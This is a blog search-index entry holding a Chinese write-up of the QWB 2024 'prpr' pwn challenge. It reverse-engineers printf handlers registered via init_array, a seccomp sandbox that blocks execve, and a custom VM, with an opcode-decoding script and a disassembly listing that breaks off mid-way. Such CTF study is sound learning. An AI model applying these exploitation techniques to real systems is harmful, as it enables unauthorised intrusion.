<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>qwb2024</title>
      <link href="/2024/11/28/qwb2024/"/>
      <url>/2024/11/28/qwb2024/</url>
      
        <content type="html"><![CDATA[<p>强网杯2024pwn复现</p><span id="more"></span><h1 id="prpr"><a href="#prpr" class="headerlink" title="prpr"></a>prpr</h1><p>复现基于ubuntu22.04环境，没有测试过远程</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="init-array"><a href="#init-array" class="headerlink" title="init_array"></a>init_array</h3><p>ida打开直接查看main函数<br><img src="/img/post/qwb2024/prpr/image.png"></p><p>发现printf函数中含有非标准库的格式化字符串符号<code>%Q%W%B</code><br>猜测它应该使用了<a href="https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html">register_printf_function</a>注册了这些格式化字符串符号<br>不过main函数没有调用register_printf_function,那应该是main函数之前动了手脚</p><p>查看start,这是每个程序的最开始的地方<br><img src="/img/post/qwb2024/prpr/image-1.png"></p><p>start调用了_libc_start_main函数，这个函数负责调用main函数<br>同时这个函数在调用main函数之前，会首先调用init_array中每个函数指针</p><p>找一下init_array段<br><img src="/img/post/qwb2024/prpr/image-2.png"></p><p>第二个函数就是调用了register_printf_function的函数<br><img src="/img/post/qwb2024/prpr/image-3.png"></p><p>main函数中调用了printf(“%Q%W%B”),对应调用了%Q，%W，%B注册的函数</p><h3 id="QWB"><a href="#QWB" class="headerlink" title="QWB"></a>QWB</h3><p>接下来开始分析每个register_printf_function注册的函数，先从%Q,%W,%B开始，因为main函数中调用了这三个函数</p><p>Q打印了prpr</p><p>W依次调用了setvbuf、signal、sandbox<br>signal给14号(即alarm信号)注册了一个handler函数<br>sandbox用prctl注册了一个沙箱，禁用了execve，直接用orw就好</p><p>B调用了PRO，接着看PRO</p><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>经过分析发现这是个虚拟机<br>P是vm_init函数，R是vm_run函数，O是vm_release函数</p><p>vm_info保存了虚拟机指令地址，指令数量，寄存器地址，寄存器数量以及整个stack和mem<br><img src="/img/post/qwb2024/prpr/vm_init.png"></p><p>大致结构如下<br><img src="/img/post/qwb2024/prpr/vm.png"></p><p>其中虚拟机指令位于<br><img src="/img/post/qwb2024/prpr/vm_opcodes.png"></p><p>vm_run函数初始化了pc、stack_pointer、mem_pointer三个指针，然后开始调用opcodes<br><img src="/img/post/qwb2024/prpr/vm_run.png"></p><p>继续分析剩下的函数，将每个符号与虚拟机指令对应<br>得到对照表<br><img src="/img/post/qwb2024/prpr/vm_function.png"></p><p>然后写个脚本翻译一下提取出的opcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># extract为从ida中提取的opcodes的byte array，太长省略了</span><br>extract = [<br>  <span class="hljs-number">0x25</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  ...<br>]<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ref = &#123;<br>    <span class="hljs-string">&quot;A&quot;</span> : <span class="hljs-string">&quot;add&quot;</span>,<br>    <span class="hljs-string">&quot;C&quot;</span> : <span class="hljs-string">&quot;and&quot;</span>,<br>    <span class="hljs-string">&quot;D&quot;</span> : <span class="hljs-string">&quot;mem_and&quot;</span>,<br>    <span class="hljs-string">&quot;E&quot;</span> : <span class="hljs-string">&quot;or&quot;</span>,<br>    <span class="hljs-string">&quot;F&quot;</span> : <span class="hljs-string">&quot;mem_or&quot;</span>,<br>    <span class="hljs-string">&quot;G&quot;</span> : <span class="hljs-string">&quot;xor&quot;</span>,<br>    <span class="hljs-string">&quot;H&quot;</span> : <span class="hljs-string">&quot;mem_xor&quot;</span>,<br>    <span class="hljs-string">&quot;i&quot;</span> : <span class="hljs-string">&quot;mul&quot;</span>,<br>    <span class="hljs-string">&quot;J&quot;</span> : <span class="hljs-string">&quot;shl&quot;</span>,<br>    <span class="hljs-string">&quot;K&quot;</span> : <span class="hljs-string">&quot;shr&quot;</span>,<br>    <span class="hljs-string">&quot;r&quot;</span> : <span class="hljs-string">&quot;greater&quot;</span>,<br>    <span class="hljs-string">&quot;M&quot;</span> : <span class="hljs-string">&quot;eq&quot;</span>,<br>    <span class="hljs-string">&quot;N&quot;</span> : <span class="hljs-string">&quot;jmp&quot;</span>,<br>    <span class="hljs-string">&quot;S&quot;</span> : <span class="hljs-string">&quot;jnz&quot;</span>,<br>    <span class="hljs-string">&quot;T&quot;</span> : <span class="hljs-string">&quot;jz&quot;</span>,<br>    <span class="hljs-string">&quot;U&quot;</span> : <span class="hljs-string">&quot;push&quot;</span>,<br>    <span class="hljs-string">&quot;V&quot;</span> : <span class="hljs-string">&quot;push mem[pop()]&quot;</span>,<br>    <span class="hljs-string">&quot;k&quot;</span> : <span class="hljs-string">&quot;push_reg&quot;</span>,<br>    <span class="hljs-string">&quot;X&quot;</span> : <span class="hljs-string">&quot;mem[pop()] = pop()&quot;</span>,<br>    <span class="hljs-string">&quot;Y&quot;</span> : <span class="hljs-string">&quot;pop_reg&quot;</span>,<br>    <span class="hljs-string">&quot;y&quot;</span> : <span class="hljs-string">&quot;print pop()&quot;</span>,<br>    <span class="hljs-string">&quot;a&quot;</span> : <span class="hljs-string">&quot;push input_int()&quot;</span>,<br>    <span class="hljs-string">&quot;b&quot;</span> : <span class="hljs-string">&quot;read_mem&quot;</span>,<br>    <span class="hljs-string">&quot;c&quot;</span> : <span class="hljs-string">&quot;write_mem&quot;</span>,<br>    <span class="hljs-string">&quot;f&quot;</span> : <span class="hljs-string">&quot;dec_sp&quot;</span>,<br>    <span class="hljs-string">&quot;g&quot;</span> : <span class="hljs-string">&quot;call&quot;</span>,<br>    <span class="hljs-string">&quot;n&quot;</span> : <span class="hljs-string">&quot;ret&quot;</span>,    <br>    <span class="hljs-string">&quot;x&quot;</span> : <span class="hljs-string">&quot;Exit&quot;</span>,<br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">250</span>):<br>    op = <span class="hljs-built_in">bytes</span>(extract[<span class="hljs-number">12</span>*i:<span class="hljs-number">12</span>*i+<span class="hljs-number">8</span>]).decode()<br>    op = op.strip(<span class="hljs-string">&quot;\x00&quot;</span>)<br>    op = op.strip(<span class="hljs-string">&quot;%&quot;</span>)<br>    op = op.strip(<span class="hljs-string">&quot;#&quot;</span>)<br>    arg = u32(<span class="hljs-built_in">bytes</span>(extract[<span class="hljs-number">12</span>*i+<span class="hljs-number">8</span>:<span class="hljs-number">12</span>*i+<span class="hljs-number">12</span>]))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i).rjust(<span class="hljs-number">3</span>,<span class="hljs-string">&quot; &quot;</span>) + <span class="hljs-string">&quot;\t&quot;</span> + ref[op].ljust(<span class="hljs-number">20</span>,<span class="hljs-string">&#x27; &#x27;</span>) + <span class="hljs-built_in">str</span>(arg))<br><br></code></pre></td></tr></table></figure><p>并且经过调试分析，发现虚拟机的pc是从71开始的，经过脚本处理与手动调整后的opcodes如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">0</span>     Exit                <span class="hljs-number">0</span><br><br><span class="hljs-attribute">1</span>:<br>  <span class="hljs-attribute">1</span>     push input_int()    <span class="hljs-number">0</span><br>  <span class="hljs-attribute">2</span>     pop_reg             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">3</span>     push                <span class="hljs-number">255</span><br>  <span class="hljs-attribute">4</span>     push_reg            <span class="hljs-number">1</span><br>  <span class="hljs-attribute">5</span>     greater             <span class="hljs-number">0</span><br>  <span class="hljs-attribute">6</span>     jnz                 <span class="hljs-number">0</span><br>  <span class="hljs-attribute">7</span>     push_reg            <span class="hljs-number">1</span><br>  <span class="hljs-attribute">8</span>     push                <span class="hljs-number">0</span><br>  <span class="hljs-attribute">9</span>     greater             <span class="hljs-number">0</span><br> <span class="hljs-attribute">10</span>     jnz                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">11</span>     push input_int()    <span class="hljs-number">0</span><br> <span class="hljs-attribute">12</span>     pop_reg             <span class="hljs-number">2</span><br> <span class="hljs-attribute">13</span>     push                <span class="hljs-number">63</span><br> <span class="hljs-attribute">14</span>     push_reg            <span class="hljs-number">2</span><br> <span class="hljs-attribute">15</span>     greater             <span class="hljs-number">0</span><br> <span class="hljs-attribute">16</span>     jnz                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">17</span>     push_reg            <span class="hljs-number">2</span><br> <span class="hljs-attribute">18</span>     push                <span class="hljs-number">0</span><br> <span class="hljs-attribute">19</span>     greater             <span class="hljs-number">0</span><br> <span class="hljs-attribute">20</span>     jnz                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">21</span>     push_reg            <span class="hljs-number">2</span><br> <span class="hljs-attribute">22</span>     push                <span class="hljs-number">4</span><br> <span class="hljs-attribute">23</span>     mul                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">24</span>     write_mem           <span class="hljs-number">0</span><br> <span class="hljs-attribute">25</span>     push_reg            <span class="hljs-number">1</span><br> <span class="hljs-attribute">26</span>     mem_and             <span class="hljs-number">0</span><br> <span class="hljs-attribute">27</span>     push_reg            <span class="hljs-number">2</span><br> <span class="hljs-attribute">28</span>     push                <span class="hljs-number">4</span><br> <span class="hljs-attribute">29</span>     mul                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">30</span>     read_mem            <span class="hljs-number">0</span><br> <span class="hljs-attribute">31</span>     ret                 <span class="hljs-number">0</span><br><br><span class="hljs-attribute">2</span>:<br> <span class="hljs-attribute">32</span>     push input_int()    <span class="hljs-number">0</span><br> <span class="hljs-attribute">33</span>     pop_reg             <span class="hljs-number">3</span><br> <span class="hljs-attribute">34</span>     push input_int()    <span class="hljs-number">0</span><br> <span class="hljs-attribute">35</span>     pop_reg             <span class="hljs-number">4</span><br> <span class="hljs-attribute">36</span>     push                <span class="hljs-number">63</span><br> <span class="hljs-attribute">37</span>     push_reg            <span class="hljs-number">4</span><br> <span class="hljs-attribute">38</span>     greater             <span class="hljs-number">0</span><br> <span class="hljs-attribute">39</span>     jnz                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">40</span>     push_reg            <span class="hljs-number">4</span><br> <span class="hljs-attribute">41</span>     push                <span class="hljs-number">0</span><br> <span class="hljs-attribute">42</span>     greater             <span class="hljs-number">0</span><br> <span class="hljs-attribute">43</span>     jnz                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">44</span>     push                <span class="hljs-number">0</span><br> <span class="hljs-attribute">45</span>     pop_reg             <span class="hljs-number">5</span><br> <span class="hljs-attribute">46</span>     push_reg            <span class="hljs-number">4</span><br> <span class="hljs-attribute">47</span>     push_reg            <span class="hljs-number">5</span><br> <span class="hljs-attribute">48</span>     greater             <span class="hljs-number">0</span><br> <span class="hljs-attribute">49</span>     jnz                 <span class="hljs-number">59</span><br> <span class="hljs-attribute">50</span>     call                <span class="hljs-number">60</span><br> <span class="hljs-attribute">51</span>     push_reg            <span class="hljs-number">3</span><br> <span class="hljs-attribute">52</span>     and                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">53</span>     print pop()         <span class="hljs-number">0</span><br> <span class="hljs-attribute">54</span>     push_reg            <span class="hljs-number">5</span><br> <span class="hljs-attribute">55</span>     push                <span class="hljs-number">1</span><br> <span class="hljs-attribute">56</span>     add                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">57</span>     pop_reg             <span class="hljs-number">5</span><br> <span class="hljs-attribute">58</span>     jmp                 <span class="hljs-number">46</span><br> <span class="hljs-attribute">59</span>     ret                 <span class="hljs-number">0</span><br><br><span class="hljs-attribute">func</span>:<br> <span class="hljs-attribute">60</span>     push input_int()    <span class="hljs-number">0</span><br> <span class="hljs-attribute">61</span>     push_reg            <span class="hljs-number">5</span><br> <span class="hljs-attribute">62</span>     mem[pop()] = pop()  <span class="hljs-number">0</span><br> <span class="hljs-attribute">63</span>     push_reg            <span class="hljs-number">5</span><br> <span class="hljs-attribute">64</span>     push mem[pop()]     <span class="hljs-number">0</span><br> <span class="hljs-attribute">65</span>     push                <span class="hljs-number">255</span><br> <span class="hljs-attribute">66</span>     eq                  <span class="hljs-number">0</span><br> <span class="hljs-attribute">67</span>     jnz                 <span class="hljs-number">0</span><br> <span class="hljs-attribute">68</span>     push_reg            <span class="hljs-number">5</span><br> <span class="hljs-attribute">69</span>     push mem[pop()]     <span class="hljs-number">0</span><br> <span class="hljs-attribute">70</span>     ret                 <span class="hljs-number">0</span><br><br><span class="hljs-attribute">_start</span>:<br> <span class="hljs-attribute">71</span>     push input_int()    <span class="hljs-number">0</span><br> <span class="hljs-attribute">72</span>     pop_reg             <span class="hljs-number">0</span><br> <span class="hljs-attribute">73</span>     push                <span class="hljs-number">1</span><br> <span class="hljs-attribute">74</span>     push_reg            <span class="hljs-number">0</span><br> <span class="hljs-attribute">75</span>     eq                  <span class="hljs-number">0</span><br> <span class="hljs-attribute">76</span>     jz                  <span class="hljs-number">79</span><br> <span class="hljs-attribute">77</span>     call                <span class="hljs-number">1</span><br> <span class="hljs-attribute">78</span>     jmp                 <span class="hljs-number">71</span><br> <span class="hljs-attribute">79</span>     push                <span class="hljs-number">2</span><br> <span class="hljs-attribute">80</span>     push_reg            <span class="hljs-number">0</span><br> <span class="hljs-attribute">81</span>     eq                  <span class="hljs-number">0</span><br> <span class="hljs-attribute">82</span>     jz                  <span class="hljs-number">85</span><br> <span class="hljs-attribute">83</span>     call                <span class="hljs-number">32</span><br> <span class="hljs-attribute">84</span>     jmp                 <span class="hljs-number">71</span><br> <span class="hljs-attribute">85</span>     push                <span class="hljs-number">3</span><br> <span class="hljs-attribute">86</span>     push_reg            <span class="hljs-number">0</span><br> <span class="hljs-attribute">87</span>     eq                  <span class="hljs-number">0</span><br> <span class="hljs-attribute">88</span>     jz                  <span class="hljs-number">91</span><br> <span class="hljs-attribute">89</span>     call                <span class="hljs-number">110</span><br> <span class="hljs-attribute">90</span>     jmp                 <span class="hljs-number">71</span><br> <span class="hljs-attribute">91</span>     push                <span class="hljs-number">4</span><br> <span class="hljs-attribute">92</span>     push_reg            <span class="hljs-number">0</span><br> <span class="hljs-attribute">93</span>     eq                  <span class="hljs-number">0</span><br> <span class="hljs-attribute">94</span>     jz                  <span class="hljs-number">97</span><br> <span class="hljs-attribute">95</span>     call                <span class="hljs-number">141</span><br> <span class="hljs-attribute">96</span>     jmp                 <span class="hljs-number">71</span><br> <span class="hljs-attribute">97</span>     push                <span class="hljs-number">5</span><br> <span class="hljs-attribute">98</span>     push_reg            <span class="hljs-number">0</span><br> <span class="hljs-attribute">99</span>     eq                  <span class="hljs-number">0</span><br><span class="hljs-attribute">100</span>     jz                  <span class="hljs-number">103</span><br><span class="hljs-attribute">101</span>     call                <span class="hljs-number">178</span><br><span class="hljs-attribute">102</span>     jmp                 <span class="hljs-number">71</span><br><span class="hljs-attribute">103</span>     push                <span class="hljs-number">6</span><br><span class="hljs-attribute">104</span>     push_reg            <span class="hljs-number">0</span><br><span class="hljs-attribute">105</span>     eq                  <span class="hljs-number">0</span><br><span class="hljs-attribute">106</span>     jz                  <span class="hljs-number">109</span><br><span class="hljs-attribute">107</span>     call                <span class="hljs-number">209</span><br><span class="hljs-attribute">108</span>     jmp                 <span class="hljs-number">71</span><br><span class="hljs-attribute">109</span>     Exit                <span class="hljs-number">0</span><br><br><span class="hljs-attribute">3</span>:<br><span class="hljs-attribute">110</span>     push input_int()    <span class="hljs-number">0</span><br><span class="hljs-attribute">111</span>     pop_reg             <span class="hljs-number">1</span><br><span class="hljs-attribute">112</span>     push                <span class="hljs-number">255</span><br><span class="hljs-attribute">113</span>     push_reg            <span class="hljs-number">1</span><br><span class="hljs-attribute">114</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">115</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">116</span>     push_reg            <span class="hljs-number">1</span><br><span class="hljs-attribute">117</span>     push                <span class="hljs-number">0</span><br><span class="hljs-attribute">118</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">119</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">120</span>     push input_int()    <span class="hljs-number">0</span><br><span class="hljs-attribute">121</span>     pop_reg             <span class="hljs-number">2</span><br><span class="hljs-attribute">122</span>     push                <span class="hljs-number">63</span><br><span class="hljs-attribute">123</span>     push_reg            <span class="hljs-number">2</span><br><span class="hljs-attribute">124</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">125</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">126</span>     push_reg            <span class="hljs-number">2</span><br><span class="hljs-attribute">127</span>     push                <span class="hljs-number">0</span><br><span class="hljs-attribute">128</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">129</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">130</span>     push_reg            <span class="hljs-number">2</span><br><span class="hljs-attribute">131</span>     push                <span class="hljs-number">4</span><br><span class="hljs-attribute">132</span>     mul                 <span class="hljs-number">0</span><br><span class="hljs-attribute">133</span>     write_mem           <span class="hljs-number">0</span><br><span class="hljs-attribute">134</span>     push_reg            <span class="hljs-number">1</span><br><span class="hljs-attribute">135</span>     mem_xor             <span class="hljs-number">0</span><br><span class="hljs-attribute">136</span>     push_reg            <span class="hljs-number">2</span><br><span class="hljs-attribute">137</span>     push                <span class="hljs-number">4</span><br><span class="hljs-attribute">138</span>     mul                 <span class="hljs-number">0</span><br><span class="hljs-attribute">139</span>     read_mem            <span class="hljs-number">0</span><br><span class="hljs-attribute">140</span>     ret                 <span class="hljs-number">0</span><br><br><span class="hljs-attribute">4</span>:<br><span class="hljs-attribute">141</span>     push input_int()    <span class="hljs-number">0</span><br><span class="hljs-attribute">142</span>     pop_reg             <span class="hljs-number">3</span><br><span class="hljs-attribute">143</span>     push input_int()    <span class="hljs-number">0</span><br><span class="hljs-attribute">144</span>     pop_reg             <span class="hljs-number">4</span><br><span class="hljs-attribute">145</span>     push                <span class="hljs-number">62</span><br><span class="hljs-attribute">146</span>     push_reg            <span class="hljs-number">4</span><br><span class="hljs-attribute">147</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">148</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">149</span>     push_reg            <span class="hljs-number">4</span><br><span class="hljs-attribute">150</span>     push                <span class="hljs-number">0</span><br><span class="hljs-attribute">151</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">152</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">153</span>     push                <span class="hljs-number">0</span><br><span class="hljs-attribute">154</span>     pop_reg             <span class="hljs-number">5</span><br><span class="hljs-attribute">155</span>     push_reg            <span class="hljs-number">4</span><br><span class="hljs-attribute">156</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">157</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">158</span>     jnz                 <span class="hljs-number">177</span><br><span class="hljs-attribute">159</span>     call                <span class="hljs-number">60</span><br><span class="hljs-attribute">160</span>     push_reg            <span class="hljs-number">3</span><br><span class="hljs-attribute">161</span>     xor                 <span class="hljs-number">0</span><br><span class="hljs-attribute">162</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">163</span>     mem[pop()] = pop()  <span class="hljs-number">0</span><br><span class="hljs-attribute">164</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">165</span>     push mem[pop()]     <span class="hljs-number">0</span><br><span class="hljs-attribute">166</span>     push                <span class="hljs-number">255</span><br><span class="hljs-attribute">167</span>     eq                  <span class="hljs-number">0</span><br><span class="hljs-attribute">168</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">169</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">170</span>     push mem[pop()]     <span class="hljs-number">0</span><br><span class="hljs-attribute">171</span>     print pop()         <span class="hljs-number">0</span><br><span class="hljs-attribute">172</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">173</span>     push                <span class="hljs-number">1</span><br><span class="hljs-attribute">174</span>     add                 <span class="hljs-number">0</span><br><span class="hljs-attribute">175</span>     pop_reg             <span class="hljs-number">5</span><br><span class="hljs-attribute">176</span>     jmp                 <span class="hljs-number">155</span><br><span class="hljs-attribute">177</span>     ret                 <span class="hljs-number">0</span><br><br><span class="hljs-attribute">5</span>:<br><span class="hljs-attribute">178</span>     push input_int()    <span class="hljs-number">0</span><br><span class="hljs-attribute">179</span>     pop_reg             <span class="hljs-number">1</span><br><span class="hljs-attribute">180</span>     push                <span class="hljs-number">255</span><br><span class="hljs-attribute">181</span>     push_reg            <span class="hljs-number">1</span><br><span class="hljs-attribute">182</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">183</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">184</span>     push_reg            <span class="hljs-number">1</span><br><span class="hljs-attribute">185</span>     push                <span class="hljs-number">0</span><br><span class="hljs-attribute">186</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">187</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">188</span>     push input_int()    <span class="hljs-number">0</span><br><span class="hljs-attribute">189</span>     pop_reg             <span class="hljs-number">2</span><br><span class="hljs-attribute">190</span>     push                <span class="hljs-number">63</span><br><span class="hljs-attribute">191</span>     push_reg            <span class="hljs-number">2</span><br><span class="hljs-attribute">192</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">193</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">194</span>     push_reg            <span class="hljs-number">2</span><br><span 